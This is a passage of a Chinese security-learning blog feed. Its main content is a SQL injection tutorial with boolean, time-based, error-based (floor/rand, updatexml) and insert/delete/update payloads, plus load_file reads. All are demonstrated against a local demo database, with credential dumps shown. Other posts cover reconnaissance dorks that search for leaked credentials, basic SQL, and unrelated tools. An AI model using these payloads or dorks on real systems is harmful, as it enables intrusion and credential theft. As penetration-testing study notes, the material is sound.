id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a><center>布尔注入</center></h2><blockquote><p>常用payload</p></blockquote><pre><code>1&#39; or 1=11 or &#39;1&#39; = &#39;11 or true&#39; or !false1 -- asdfasdf #mid(str,start,length): 字符串截取函数 start&gt;=1, length &lt;= 字符串长度MariaDB [demo]&gt; select mid(&#39;12345&#39;,1,2);+------------------+| mid(&#39;12345&#39;,1,2) |+------------------+| 12               |+------------------+#ord():   ASCII码转换函数ord(**) MariaDB [demo]&gt; select ord(&#39;A&#39;);+----------+| ord(&#39;A&#39;) |+----------+|       65 |+----------+#length(): 长度测量 select length(&#39;12345&#39;);+-----------------+| length(&#39;12345&#39;) |+-----------------+|               5 |+-----------------+#version() 数据库版本查看#databse() 数据库名查看#user() 数据库用户查看#show databases; 当前数据库仓储中有什么数据库#select count(SCHEMA_NAME) from information_schema.schemata;  获取当前数据仓储中有多少数据库#1&#39; and length(database()) &gt;=4 当返回True时，可以获取数据库名长度MariaDB [demo]&gt; select * from admin where id=1 and length(database()) &gt;=5;Empty set (0.000 sec)MariaDB [demo]&gt; select * from admin where id=1 and length(database()) &gt;=4;+------+-------+----------+-------------+| id   | name  | password | commint_new |+------+-------+----------+-------------+|    1 | admin | 123456   | NULL        |+------+-------+----------+-------------+#1&#39; and mid(database(),1,1) = &#39;d&#39;  用来遍历数据库名MariaDB [demo]&gt; select * from admin where id=1 and mid(database(),1,1) = &#39;a&#39;;Empty set (0.001 sec)MariaDB [demo]&gt; select * from admin where id=1 and mid(database(),1,1) = &#39;b&#39;;Empty set (0.000 sec)MariaDB [demo]&gt; select * from admin where id=1 and mid(database(),1,1) = &#39;c&#39;;Empty set (0.000 sec)MariaDB [demo]&gt; select * from admin where id=1 and mid(database(),1,1) = &#39;d&#39;;+------+-------+----------+-------------+| id   | name  | password | commint_new |+------+-------+----------+-------------+|    1 | admin | 123456   | NULL        |+------+-------+----------+-------------+MariaDB [demo]&gt; select * from admin where id=1 and ord(mid(database(),1,1)) &gt;=101; ---枚举字符可以转成ascii码用于判断Empty set (0.000 sec)MariaDB [demo]&gt; select * from admin where id=1 and ord(mid(database(),1,1)) &gt;=100;+------+-------+----------+-------------+| id   | name  | password | commint_new |+------+-------+----------+-------------+|    1 | admin | 123456   | NULL        |+------+-------+----------+-------------+</code></pre><h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a><center>时间注入</center></h2><blockquote><p>常用payload</p></blockquote><pre><code>sleep(x)  x是秒数sleep(if(true,x,0)) 如果表达式为真，则休眠x秒， #判断数据库个数MariaDB [demo]&gt; select * from admin where id =1 and sleep(if((select count(schema_name) from information_schema.schemata) =1,5,0));  Empty set (0.001 sec)MariaDB [demo]&gt; select * from admin where id =1 and sleep(if((select count(schema_name) from information_schema.schemata) =5,5,0)); --如果数据库数目等于1，则休眠5秒Empty set (5.001 sec)</code></pre><h2 id="mysql数据库BUG注入"><a href="#mysql数据库BUG注入" class="headerlink" title="mysql数据库BUG注入"></a><center>mysql数据库BUG注入</center></h2><pre><code>#利用数据库的BUG（即，count(), rand(),group by 连用时）进行利用，看报错信息。报错信息里携带了敏感数据#mmysql有个bug，在表数据条目大于3情况下会返回字段值,小于3条时会返回表记录。早期版本，新版本已修复，老版本任然好用- 表记录小于3条时：MariaDB [demo]&gt; select concat(floor(rand(0)*2),&quot;+++++++&quot;) as xx,count(1) from admin1 group by xx;+----------+----------+| xx       | count(1) |+----------+----------+| 1+++++++ |        1 |+----------+----------+表记录大于3条时：MariaDB [demo]&gt; select concat(floor(rand(0)*2),&quot;+++++++&quot;) as xx,count(1) from admin group by xx;ERROR 1062 (23000): Duplicate entry &#39;1+++++++&#39; for key &#39;group_key&#39;此时可以加以利用(爆库)爆出数据库名，用户名等MariaDB [demo]&gt; select concat(floor(rand(0)*2),database()) as xx,count(1) from admin1 group by xx;ERROR 1062 (23000): Duplicate entry &#39;1demo&#39; for key &#39;group_key&#39;MariaDB [demo]&gt; select concat(floor(rand(0)*2),user()) as xx,count(1) from admin1 group by xx;ERROR 1062 (23000): Duplicate entry &#39;1root@&#39; for key &#39;group_key&#39;(爆表)爆当前数据库所有表名（admin1）MariaDB [demo]&gt; select concat(floor(rand(0)*3),(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1)) as xx,count(1) from admin group by xx;ERROR 1062 (23000): Duplicate entry &#39;1admin1&#39; for key &#39;group_key&#39;(爆表的字段)爆当前数据库表的列名MariaDB [demo]&gt; select concat(floor(rand(0)*3),(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39; limit 0,1)) as xx,count(1) from admin group by xx;ERROR 1062 (23000): Duplicate entry &#39;1id&#39; for key &#39;group_key&#39;（爆表记录）MariaDB [demo]&gt; select concat(floor(rand(0)*2),(select concat(&#39;|&#39;,id,&#39;|&#39;,name,&quot;|&quot;,password) from admin limit 0,1)) as xx,count(1) from admin group by xx;ERROR 1062 (23000): Duplicate entry &#39;1|1|admin|123456&#39; for key &#39;group_key&#39;</code></pre><h2 id="mysql注入函数报错"><a href="#mysql注入函数报错" class="headerlink" title="mysql注入函数报错"></a><center>mysql注入函数报错</center></h2><ul><li>updatxml</li></ul><pre><code>UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据 MariaDB [demo]&gt; select * from admin where id =1 and updatexml(1,conact(0x7c,(select user()),1),1);ERROR 1305 (42000): FUNCTION demo.conact does not exist</code></pre><ul><li>extractvalue</li></ul><pre><code>extractvalue(目标xml文档，xml路径)MariaDB [demo]&gt; select * from admin where id =1 and updatexml(1,concat(0x7c,(select user()),1),1);ERROR 1105 (HY000): XPATH syntax error: &#39;|root@1&#39;</code></pre><h2 id="添加型注入"><a href="#添加型注入" class="headerlink" title="添加型注入"></a><center>添加型注入</center></h2><ul><li>一样都是提前闭合，改变sql语句含义，将sql payload结果 insert、update进数据库，再查询获得注入结果</li></ul><pre><code>MariaDB [demo]&gt; select * from admin1;+------+------+----------+| id   | name | password |+------+------+----------+|    1 | aaa  | 123456   |+------+------+----------+1 row in set (0.001 sec)#场景一MariaDB [demo]&gt; insert into admin1 values(2,(select user()),(select database()));Query OK, 1 row affected (0.369 sec)MariaDB [demo]&gt; select * from admin1;+------+-------+----------+| id   | name  | password |+------+-------+----------+|    1 | aaa   | 123456   ||    2 | root@ | demo     |+------+-------+----------+#场景二insert into admin1 values(2,&#39;demo&#39;,( select concat(1,column_name,1) from information_schema.columns where table_name=&#39;admin&#39; limit 0,1));insert into admin1 values(2,&#39;demo&#39;,( select concat(1,column_name,1) from information_schema.columns where table_name=&#39;admin&#39; limit 1,1));insert into admin1 values(2,&#39;demo&#39;,( select concat(1,column_name,1) from information_schema.columns where table_name=&#39;admin&#39; limit 2,1));insert into admin1 values(2,&#39;demo&#39;,( select concat(1,column_name,1) from information_schema.columns where table_name=&#39;admin&#39; limit 3,1));MariaDB [demo]&gt; select * from admin1;+------+-------+---------------+| id   | name  | password      |+------+-------+---------------+|    1 | aaa   | 123456        ||    2 | root@ | demo          ||    2 | demo  | 1id1          ||    2 | demo  | 1name1        ||    2 | demo  | 1password1    ||    2 | demo  | 1commint_new1 |+------+-------+---------------+#场景三insert into admin1 values(2,&#39;demo&#39;,( select concat(load_file(&#39;./index.php&#39;))));MariaDB [demo]&gt; insert into admin1 values(2,&#39;demo&#39;,( select concat(load_file(&#39;./index.php&#39;))));Query OK, 1 row affected (0.001 sec)MariaDB [demo]&gt; select * from admin1;+------+------+--------------------+| id   | name | password           |+------+------+--------------------+|    1 | aaa  | 123456             ||    2 | demo | &lt;?php phpinfo()?&gt; |+------+------+--------------------+【&lt;?php phpinfo()?&gt;】等于 0x2e2f696e6465782e706870MariaDB [demo]&gt; insert into admin1 values(2,&#39;demo&#39;,( select concat(load_file(0x2e2f696e6465782e706870))));Query OK, 1 row affected (0.004 sec)MariaDB [demo]&gt; select * from admin1;+------+------+--------------------+| id   | name | password           |+------+------+--------------------+|    1 | aaa  | 123456             ||    2 | demo | &lt;?php phpinfo()?&gt; |+------+------+--------------------+</code></pre><h2 id="删除型注入"><a href="#删除型注入" class="headerlink" title="删除型注入"></a><center>删除型注入</center></h2><ul><li>delete语句特征，只能以and 布尔型值作为注入</li></ul><pre><code>MariaDB [demo]&gt; delete from admin1 where id=2 and sleep(if((select database() = &#39;demo&#39;),5,0));Query OK, 0 rows affected (5.002 sec)注意，只有当数据库中有id=2这条记录，sleep才能工作。否则如下。sleep函数不工作MariaDB [demo]&gt; delete from admin1 where id=3 and sleep( if((select database()=&#39;demo&#39;),5,0));Query OK, 0 rows affected (0.001 sec)</code></pre><h2 id="修改型注入"><a href="#修改型注入" class="headerlink" title="修改型注入"></a><center>修改型注入</center></h2><ul><li>update语句特征，可以从修改值的方式注入，或条件的方式注入</li></ul><pre><code>例如：POST Head：http://127.0.0.1/aaa/update.php?act=update&amp;id=17POST data：name=a&amp;text=b封装的SQL语句为: update admin1 set name=&#39;a&#39; ,text=&#39;b&#39; where id=17此时用延时注入，判断注入点：MariaDB [demo]&gt; update admin1 set password=&#39;b&#39;;Query OK, 0 rows affected (0.001 sec)Rows matched: 2  Changed: 0  Warnings: 0MariaDB [demo]&gt; update admin1 set password=&#39;b&#39; where sleep(5);Query OK, 0 rows affected (10.001 sec)Rows matched: 0  Changed: 0  Warnings: 0</code></pre>]]></content>
      
      
      <categories>
          
          <category> PenTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InfoGathering-信搜</title>
      <link href="/2020/02/05/infogathering-xin-sou/"/>
      <url>/2020/02/05/infogathering-xin-sou/</url>
      
        <content type="html"><![CDATA[<!--> 背景音乐<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1357785909&auto=1&height=66"></iframe></div>--><h1 id="InfoGathering-信息搜集"><a href="#InfoGathering-信息搜集" class="headerlink" title="InfoGathering-信息搜集"></a><center>InfoGathering-信息搜集</center></h1><hr><h2 id="被动信息搜集"><a href="#被动信息搜集" class="headerlink" title="被动信息搜集"></a>被动信息搜集</h2><h3 id="0x01-Google-hacking-常用语法"><a href="#0x01-Google-hacking-常用语法" class="headerlink" title="0x01 Google-hacking-常用语法"></a>0x01 Google-hacking-常用语法</h3><blockquote><p>GoogleHack（谷歌语法）是指通过一系列指令在Google上进行信息搜索，从而快速搜索到指定的目标。比如使用搜索包含指定url：inurl:xxx，搜索包含指定标题：intitle:xxx。使用这种搜索方式通常可以避免大海捞针式的搜索目标，可以极大的缩小搜索范围，甚至直接定位到自己想要的目标。同样的技巧还有很多，常用的Github也可以实现</p></blockquote><ul><li>后台地址</li></ul><ol><li>site:xxx.xxx 管理后台/登陆/管理员/系统</li><li>site:xxx.xxx inurl:login/admin/system/guanli/denglu</li></ol><ul><li>敏感文件</li></ul><ol><li>site:xxx.xxx filetype:pdf/doc/xls/txt</li><li>site:xxx.xxx filetype:log/sql/conf</li></ol><ul><li>测试环境</li></ul><ol><li>site:xxx.xxx inurl:test/ceshi</li><li>site:xxx.xxx intitle:测试</li></ol><ul><li>邮箱/QQ/群</li></ul><ol><li>site:xxx.xxx 邮件/email</li><li>site:xxx.xxx qq/群/企鹅/腾讯</li></ol><ul><li>其他</li></ul><ol><li>site:xxx.xxx inurl:api</li><li>site:xxx.xxx inurl:uid=/id=</li><li>site:xxx.xxx intitle:index of</li></ol><hr><h3 id="0x02-Github搜索"><a href="#0x02-Github搜索" class="headerlink" title="0x02 Github搜索"></a>0x02 Github搜索</h3><ul><li>搜索特殊关键词</li></ul><ol><li>@xxx.com password/secret/credentials/token</li><li>@xxx.com config/key/pass/login/ftp/pwd</li></ol><ul><li>搜索连接凭证</li></ul><ol><li>@xxx.com security_credentials/connetionstring</li><li>@xxx.com JDBC/ssh2_auth_password/send_keys</li></ol><hr><h3 id="0x03-信搜工具"><a href="#0x03-信搜工具" class="headerlink" title="0x03 信搜工具"></a>0x03 信搜工具</h3><ul><li><p><strong>GSIL</strong> [GitHub Sensitive Information Leakage]<br>近实时监控GitHub敏感信息泄露，并发送告警通知<br><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p></li><li><p><strong>GitPrey</strong> [GitHub Sensitive Information Leakage]<br>GitPrey是根据企业关键词进行项目检索以及相应敏感文件和敏感文件内容扫描的工具<br><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">https://github.com/repoog/GitPrey</a></p></li><li><p><strong>Nuggests</strong><br>自动爬取Github上文件敏感信息泄露，抓取邮箱密码并自动登录邮箱验证，支持126，qq，sina，163邮箱<br><a href="https://github.com/az0ne/Github_Nuggests" target="_blank" rel="noopener">https://github.com/az0ne/Github_Nuggests</a></p></li><li><p><strong>theHarvester</strong><br>theHarvester是一种非常简单但有效的工具，旨在用于渗透测试的早期阶段。使用它进行开源情报收集，并帮助确定公司在Internet上的外部威胁情况。该工具使用多个公共数据源收集电子邮件，名称，子域，IP和URL，这些公共数据源包括<br><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a></p></li></ul><h2 id="主动信息搜集"><a href="#主动信息搜集" class="headerlink" title="主动信息搜集"></a>主动信息搜集</h2><!--#### 0x0101 二级标题##### 有序号列表1. aaa2. bbb    + b1    + b2```本地图片 ![描述](当前所在目录的文件夹/1.jpg) ![网络图片](https://cache.soso.com/baike/i/logo/unify_logo_1@1x.png) 指定图片尺寸,用html方式,markdown不支持<img src="https://cache.soso.com/baike/i/logo/unify_logo_1@1x.png" width="50%">插入本地视频<video src="视频名.mp4" controls="controls" style="max-width: 100%; display: block; margin-left: auto; margin-right: auto;"></video>插入外链视频<iframe height=498 width=510 src="视频地址"><iframe height=498 width=510 src="视频地址" frameborder=0 allowfullscreen></iframe>插入音频例如要外链的歌曲https://music.163.com/#/song?id=1357785909该音乐外链地址即为：http://music.163.com/song/media/outer/url?id=1357785909.mp3嵌入代码为：<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1357785909&auto=1&height=66"></iframe></div>```##### 高亮    `heightlight`##### 代码块``` bash/python/html/javascriptecho "Hello world!"print("Hello world")<hr>Hello world</hr><script>    document.write("Hello World！")</script>-->]]></content>
      
      
      <categories>
          
          <category> PenTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> InfoGathering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL-初级篇</title>
      <link href="/2020/02/04/sql-chu-ji-pian/"/>
      <url>/2020/02/04/sql-chu-ji-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="常用SQL语句，持续更新"><a href="#常用SQL语句，持续更新" class="headerlink" title="常用SQL语句，持续更新"></a><center>常用SQL语句，持续更新</center></h1><hr><h1 id="SQL-初级篇"><a href="#SQL-初级篇" class="headerlink" title="SQL-初级篇"></a>SQL-初级篇</h1><h2 id="数据库的增-删-改-查"><a href="#数据库的增-删-改-查" class="headerlink" title="数据库的增/删/改/查"></a>数据库的增/删/改/查</h2><pre><code>- 创建数据库    create database demo;- 删除数据库    drop database demo;- 进入某个数据库show    use demo;- 查询库中所有表    show tables;- 查询创建库的sql语句    show create database demo;- 查询创建admin表的sql语句    show create table demo.admin;</code></pre><h2 id="表的增-删-改-查"><a href="#表的增-删-改-查" class="headerlink" title="表的增/删/改/查"></a>表的增/删/改/查</h2><pre><code>- 创建表    create table admin (id int, name char(32), password char(32));    create table admin1 (id int, name char(32), password char(32) default 123456);  --创建字段带默认值的表    create table admin2 select * from admin; --复制一个表到新表    create table admin3 select id from admin; --复制一个表字段为id的所有数据到新表- 删除表    drop table admin;- 修改表    alter table admin add column commint varchar(255); --增加列    alter table admin change column commint commint_new varchar(254); --修改列或类型    alter table admin alter column commint_new set default &#39;aaa&#39;; -- 给列设置默认值，或删除默认值drop default;    alter table admin modify column commint_new char(255); --修改列类型    alter table admin2 rename to tmp; --重命名表- 查看表结构    desc admin;</code></pre><h2 id="条目的增-删-改-查"><a href="#条目的增-删-改-查" class="headerlink" title="条目的增/删/改/查"></a>条目的增/删/改/查</h2><pre><code>- 插入数据(不带字段，除关键字段必输入外，其他默认值)    insert into admin values(1,&#39;admin&#39;,123456);- 插入数据(带字段)    insert into admin1 (id,name) values(1,&#39;admin&#39;);  --使用字段默认值，前面必须制定字段- 删除表数据    delete from admin1; --删除整表记录    delete from admin1 where id=1; - 修改表数据    update admin set id=2 where name=&#39;ww&#39;; --修改全表id为2    update admin set id=2 where name=&#39;ww&#39;; --修改name为ww的id为2- 查询表数据    select * from admin; --整表，所有字段，所有条目查询    select id,name from admin; --表，所有条目的column1,column2查询    select id,name from admin where id = 2; --查询id为2的字段id和name    select id,name from admin having id = 2; --查询id为2的字段id和name    select id,name from admin where id = 2 or name = &#39;admin&#39;; --查询id为2或name为admin的记录    select id,name from admin having id = 2 or name = &#39;admin&#39;; --查询id为2或name为admin的记录    select * from admin order by id desc; --查询表，并按照字段id 降序排列    select * from admin order by id asc; --查询表，并按照字段id 降序排列    select * from admin group by id ; --按id分类数据，去重。重复只显示第一条数据    select * from admin limit 0,6; --限定查询出的数据条数（从第0条开始，读取6条记录）。limit x,y 即：从0开始计算，从第x条开始，包括x本身的后y条    select * from admin limit 6; --效果同上，省略了0，默认为从0开始</code></pre><h2 id="用户的增-删-改-查"><a href="#用户的增-删-改-查" class="headerlink" title="用户的增/删/改/查"></a>用户的增/删/改/查</h2><pre><code>- 创建用户    CREATE USER &#39;demo&#39; IDENTIFIED BY &#39;demo&#39;; --创建demo用户，不限制访问地址，即%    create user &#39;demo&#39;@&#39;localhost&#39; identified by &#39;demo&#39;; -创建demo用户，并限制访问地址- 删    drop user &#39;demo&#39;;- 改    RENAME user &#39;demo&#39;@&#39;访问host&#39; TO &#39;demo1&#39;; --重命名用户名; --根据实际填写    SET PASSWORD FOR &#39;root&#39;@&#39;访问host&#39;  = &#39;root@1236&#39;; --根据实际填写    update mysql.user set password=PASSWORD(&#39;1q2w3e&#39;) where User=&#39;root&#39;;- 查询    select user,password from msql.user;- root密码忘记补救方法    root 密码忘记，使用    echo &quot;set password FOR &#39;root&#39;@&#39;localhost&#39; = PASSWORD(&#39;新密码&#39;);&quot;  &gt;&gt; init.txt    pkill mysql    pkill mysql_safe    mysqld --init-file=init.txt &amp;    mysql -uroot -p新密码    use mysql;    update user set password=PASSWORD(&#39;新密码&#39;) where user=&#39;root&#39;;</code></pre>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nb的开源录屏录音工具-Captura</title>
      <link href="/2020/02/04/nb-de-kai-yuan-lu-ping-lu-yin-gong-ju-captura/"/>
      <url>/2020/02/04/nb-de-kai-yuan-lu-ping-lu-yin-gong-ju-captura/</url>
      
        <content type="html"><![CDATA[<!--<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1357785909&auto=1&height=66"></iframe></div>--><h2 id="Captura"><a href="#Captura" class="headerlink" title="Captura"></a><center>Captura</center></h2><hr><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><blockquote><p>Captura 是一款可以截图，录屏，录不同音源，以及在录制视频时可以记录键盘，鼠标事件的工具。它的视频引擎使用的是ffmpeg开源工具。因而也继承了这一开源属性</p></blockquote><h1 id="0x02-官网"><a href="#0x02-官网" class="headerlink" title="0x02 官网"></a>0x02 官网</h1><blockquote><p><a href="https://mathewsachin.github.io/Captura/" target="_blank" rel="noopener">官网</a><br><a href="https://mathewsachin.github.io/Captura/download/" target="_blank" rel="noopener">下载链接</a><br><a href="https://github.com/MathewSachin/Captura" target="_blank" rel="noopener">Github Page</a></p></blockquote><h1 id="0x02-录屏效果"><a href="#0x02-录屏效果" class="headerlink" title="0x02 录屏效果"></a>0x02 录屏效果</h1><p><video src="2020-02-04-13-44-06.mp4" controls="controls" style="max-width: 100%; display: block; margin-left: auto; margin-right: auto;"></video></p><center>39秒，2.03 MB（画质可自行调）</center><h1 id="0x03-软件界面"><a href="#0x03-软件界面" class="headerlink" title="0x03 软件界面"></a>0x03 软件界面</h1><p><img src="1.jpg" alt><br><img src="2.jpg" alt><br><img src="3.jpg" alt></p><h1 id="0x04-设置"><a href="#0x04-设置" class="headerlink" title="0x04 设置"></a>0x04 设置</h1><p><img src="4.jpg" alt><br><img src="5.jpg" alt><br><img src="6.jpg" alt></p><blockquote><p>该工具是个很不错的工具，如果你认为8错，可以捐助来支持作者</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 视频工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 视频工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown-cheatsheet</title>
      <link href="/2020/02/02/markdown-cheatsheet/"/>
      <url>/2020/02/02/markdown-cheatsheet/</url>
      
        <content type="html"><![CDATA[<pre><code>## &lt;center&gt;居中&lt;/center&gt;&gt; 应用文章或概述或做标题# 0x01 标题#### 0x0101 标题*斜体***加粗**~~删除线~~分隔符---***##### 有序号列表1. aaa2. bbb    + b1    + b2##### 无序号列表- 1 无须列表    - 1.1 aaa            - 1.1.1 aaa            - 1.1.1.1 aaa    - 1.2 bbb##### 表格列1|列2:-:|:-:行1|行2|##### 图片    本地图片 ![描述](当前所在目录的文件夹/1.jpg)     ![网络图片](https://cache.soso.com/baike/i/logo/unify_logo_1@1x.png)     指定图片尺寸,用html方式,markdown不支持    &lt;img src=&quot;https://cache.soso.com/baike/i/logo/unify_logo_1@1x.png&quot; width=&quot;50%&quot;&gt; ##### 超链    [官网](https://royeew.gitee.io)    直接使用超链 &lt;https://royeew.gitee.io&gt;##### 注释    &lt;!--注释--&gt;##### 高亮    `heightlight`##### 代码块    ``` 包裹一段代码，并指定一种语言（也可以不指定）        echo &quot;Hello World!&quot;    ```    ```         普通块    ```    ``` bash    echo &quot;Hello World!&quot;    #!/usr/bin/env python    ```    ``` python    print(&quot;Hello World!&quot;)    #!/usr/bin/env python    ```    ``` print(&quot;Hello World!&quot;) ```</code></pre>]]></content>
      
      
      <categories>
          
          <category> markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CAPTCHA-验证码-介绍</title>
      <link href="/2020/02/02/captcha-yan-zheng-ma-lou-dong/"/>
      <url>/2020/02/02/captcha-yan-zheng-ma-lou-dong/</url>
      
        <content type="html"><![CDATA[<blockquote><p>你是不是要经常输入验证码？登录网站时输完密码，要输入一个单词或者几个歪歪扭扭不怎么好辨认的字母，这个场景一定不陌生？有没有思考为什么要输入验证码？验证码有什么作用？</p></blockquote><h2 id="什么是验证码"><a href="#什么是验证码" class="headerlink" title="什么是验证码?"></a>什么是验证码?</h2><h3 id="CAPTCHA"><a href="#CAPTCHA" class="headerlink" title="CAPTCHA"></a>CAPTCHA</h3><p>CAPTCHA，Completely Automated Public Turing Test to tell Computers and Humans Apart<br>由CMU的教授Luis von Ahn提出，翻译一下是“全自动区分计算机和人类的图灵测试”，能够防止软件被大量恶意攻击<br><img src="1.jpg" alt></p><h3 id="reCAPTCHA"><a href="#reCAPTCHA" class="headerlink" title="reCAPTCHA"></a>reCAPTCHA</h3><p>Luis von Ahn算了笔帐，假如每次人们输入验证码需要10秒钟，每天有2亿人需要输入验证码，那么人类就浪费了50万个小时！<br>这个数字是很可怕的，于是他弄了一个东西出来，叫 reCAPTCHA。reCAPTCHA和CAPTCHA的不同的每次要输入两个单词<br><img src="2.jpg" alt></p><h2 id="验证码的漏洞"><a href="#验证码的漏洞" class="headerlink" title="验证码的漏洞"></a>验证码的漏洞</h2><p>分两种:</p><ol><li>验证码输入正确, 但是没有进行刷新</li><li>验证码可识别</li></ol><h2 id="验证码的漏洞-修补"><a href="#验证码的漏洞-修补" class="headerlink" title="验证码的漏洞-修补"></a>验证码的漏洞-修补</h2><ol><li>验证码,提交服务端处理, 当验证码在判断逻辑使用后,需要立即刷新验证码,然后再进入后续代码逻辑</li></ol>]]></content>
      
      
      <categories>
          
          <category> 验证码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 验证码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-PWK-知识体系思维导图</title>
      <link href="/2020/02/01/oscp-pwk-zhi-shi-ti-xi-si-wei-dao-tu/"/>
      <url>/2020/02/01/oscp-pwk-zhi-shi-ti-xi-si-wei-dao-tu/</url>
      
        <content type="html"><![CDATA[<p><img src="1.jpg" alt="Linux基础"><br><img src="2.jpg" alt="nc-netcat-ncat"><br><img src="3.jpg" alt="被动信息搜集"><br><img src="4.jpg" alt="主动信息搜集及漏扫"><br><img src="5.jpg" alt="SLMail server的BOF"><br><img src="6.jpg" alt="Linux高阶"><br><img src="7.jpg" alt="win32"><br><img src="8.jpg" alt="MySQL"><br><img src="9.jpg" alt="web漏洞"><br><img src="10.jpg" alt="MySQL提权"><br><img src="11.jpg" alt="Linux提权基础I"><br><img src="12.jpg" alt="Linux提权基础II"><br><img src="13.jpg" alt="Windows提权"></p><blockquote><p>参考文献<br>[1] Offensive Security.Penetration Testing Virtual Labs[Z],[Online]Available:<a href="https://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/.(2019)" target="_blank" rel="noopener">https://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/.(2019)</a><br>[2] Offensive Security.Penetration Testing with Kali Lab Overview[Z]，[Online]Available:<a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/.(2019)" target="_blank" rel="noopener">https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/.(2019)</a><br>[3] Abatchy.OSCP-like Vulnhub VMs[Z],[Online]Available:<a href="https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms.html.(2017-02-23)" target="_blank" rel="noopener">https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms.html.(2017-02-23)</a><br>[4] happytree.OSCP经验分享[Z]，[Online]Available:<a href="https://xz.aliyun.com/t/1587/.(2017-11-15)" target="_blank" rel="noopener">https://xz.aliyun.com/t/1587/.(2017-11-15)</a><br>[5] g0tmi1k.Basic Linux Privilege Escalation[Z]，[Online]Available:<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/.(2011-08-02)" target="_blank" rel="noopener">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/.(2011-08-02)</a><br>[6] FuzzySecurity.Windows Privilege Escalation Fundamentals[Z]，[Online]Available:<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></p></blockquote><h4 id="如果觉得图不错，我觉得你可以鼓励一下我。"><a href="#如果觉得图不错，我觉得你可以鼓励一下我。" class="headerlink" title="如果觉得图不错，我觉得你可以鼓励一下我。"></a><center>如果觉得图不错，我觉得你可以鼓励一下我。</center></h4>]]></content>
      
      
      <categories>
          
          <category> OSCP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
            <tag> PenTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>B站,油管等视频网站视频下载</title>
      <link href="/2020/02/01/shi-pin-wang-zhan-shi-pin-xia-zai/"/>
      <url>/2020/02/01/shi-pin-wang-zhan-shi-pin-xia-zai/</url>
      
        <content type="html"><![CDATA[<h1 id="B站-油管等视频网站视频下载-You-Get"><a href="#B站-油管等视频网站视频下载-You-Get" class="headerlink" title=" B站,油管等视频网站视频下载 You-Get"></a><center> B站,油管等视频网站视频下载 You-Get</center></h1><blockquote><p><strong>前言</strong></p><p>我们有时在视频网站上看到一些经典的视频片段，想要下载下来收藏或分享给朋友。但是很多主流的视频网站必须要安装客户端才可以下载，比较麻烦；也有的并不提供下载功能。<br>我们可以通过一些工具来下载,这里我们介绍一款工具You-Get</p></blockquote><hr><h3 id="You-Get-介绍"><a href="#You-Get-介绍" class="headerlink" title="You-Get 介绍"></a>You-Get 介绍</h3><p>   <a href="https://you-get.org/" target="_blank" rel="noopener">官网</a> https //you-get.org</p><blockquote><p>You-Get is a tiny command-line utility to download media contents (videos, audios, images) from the Web, in case there is no other handy way to do it.</p></blockquote><h3 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h3><pre class="line-numbers language-code"><code class="language-code">$ you-get 'https://www.youtube.com/watch?v=jNQXAC9IVRw'site:                YouTubetitle:               Me at the zoostream:    - itag:          43      container:     webm      quality:       medium      size:          0.5 MiB (564215 bytes)    # download-with: you-get --itag=43 [URL]Downloading Me at the zoo.webm ... 100% (  0.5/  0.5MB) ├██████████████████████████████████┤[1/1]    6 MB/sSaving Me at the zoo.en.srt ... Done.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="You-Get-安装"><a href="#You-Get-安装" class="headerlink" title="You-Get 安装"></a>You-Get 安装</h3><h4 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h4><ul><li>Python 3.2 or above  </li><li>FFmpeg 1.0 or above</li></ul><p><strong>1. Python3 安装请自行搜狗搜索</strong><br><strong>2. FFmpeg 